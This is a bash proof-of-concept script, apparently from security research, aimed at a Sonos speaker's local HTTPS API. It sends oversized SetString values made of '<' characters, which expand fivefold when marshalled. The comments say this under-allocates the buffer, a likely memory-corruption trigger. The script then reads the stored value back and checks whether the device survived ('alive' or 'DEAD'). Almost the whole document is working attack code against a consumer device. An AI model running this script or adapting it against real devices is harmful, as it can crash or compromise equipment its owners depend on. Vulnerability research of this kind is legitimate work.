#!/usr/bin/env bash
# jc7 T2 positive oracle: an ESCAPING value expands 5x, so the size request
# 2*len(value)+16 under-requests the marshalled element by ~3*len(value) while the name
# stays valid (200-path). Read the value back and measure what actually got stored.
set -u
IP=${IP:-192.168.4.86}; U=${U:-RINCON_7828CA9221DC01400}; OUT=${OUT:-recon/jc7/weak_fire4.tsv}
SPACING=${SPACING:-3}
printf 'ts\tcase\tstatus\tstored_len\thead\ttail\n' > "$OUT"
post() { printf '%s' "$1" > /tmp/jc7_w4.json
  curl -sk -m 60 -o /tmp/jc7_w4.out -w '%{http_code}' --http1.1 -X POST \
    -H 'X-Sonos-Api-Key: x' -H 'Content-Type: application/json' --data-binary @/tmp/jc7_w4.json \
    "https://$IP:1443/api/v1/players/$U/upnpSystemProperties"; }
mk() { python3 - "$1" "$2" "$3" <<'PY'
import json,sys
k,ch,n=sys.argv[1],sys.argv[2],int(sys.argv[3])
print(json.dumps({"method":"SetString","input":[{"name":"VariableName","value":k},{"name":"StringValue","value":ch*n}]}))
PY
}
run() { local k=$1 ch=$2 n=$3
  local st; st=$(post "$(mk "$k" "$ch" "$n")")
  local rb; rb=$(post "{\"method\":\"GetString\",\"input\":[{\"name\":\"VariableName\",\"value\":\"$k\"}]}")
  local len head tail
  len=$(python3 -c "import json;d=json.load(open('/tmp/jc7_w4.out'));p=d.get('parameters') or [{}];v=p[0].get('value','');print(len(v))" 2>/dev/null || echo NA)
  head=$(python3 -c "import json;d=json.load(open('/tmp/jc7_w4.out'));p=d.get('parameters') or [{}];print(repr(p[0].get('value','')[:12]))" 2>/dev/null || echo NA)
  tail=$(python3 -c "import json;d=json.load(open('/tmp/jc7_w4.out'));p=d.get('parameters') or [{}];print(repr(p[0].get('value','')[-12:]))" 2>/dev/null || echo NA)
  printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$(date -u +%H:%M:%S)" "k=$k ch=$ch n=$n" "$st" "$len" "$head" "$tail" | tee -a "$OUT"
  sleep "$SPACING"
}
run jc7a a 70000        # control: no expansion
run jc7b '<' 70000      # 5x expansion -> marshalled ~350 kB
run jc7c '<' 200000     # ~1 MB
st=$(curl -s -m 4 -o /dev/null -w '%{http_code}' "http://$IP:1400/status/VERSION")
printf '%s\tBATCH_END\t%s\t-\t-\t%s\n' "$(date -u +%H:%M:%S)" "$st" "$([ "$st" = 200 ] && echo alive || echo DEAD)" | tee -a "$OUT"
